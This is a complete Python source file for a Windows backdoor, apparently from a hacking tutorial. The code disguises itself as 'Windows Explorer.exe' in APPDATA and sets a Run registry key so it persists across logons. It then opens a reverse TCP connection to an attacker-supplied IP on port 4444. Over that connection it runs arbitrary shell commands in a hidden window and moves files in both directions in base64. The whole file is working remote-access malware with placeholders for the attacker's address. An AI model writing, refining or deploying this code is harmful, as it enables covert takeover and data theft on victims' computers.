import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        # evil_file_location = os.environ.get["appdata"] + "\\Windows Explorer.exe" #name is upto you
        evil_file_location = os.path.join(os.environ.get("APPDATA", ""), "Windows Explorer.exe")

        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode())
            except:
                continue
    
    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] changing working directory" + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Upload successfull"
    
    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode()

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command)>1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command Execution"

            self.reliable_send(command_result)
try:
    my_backdoor = Backdoor("ENTER IP OF ATTACKER MACHINE", 4444) #Mention any port number you prefer 
    my_backdoor.run()
except Exception:
    sys.exit()
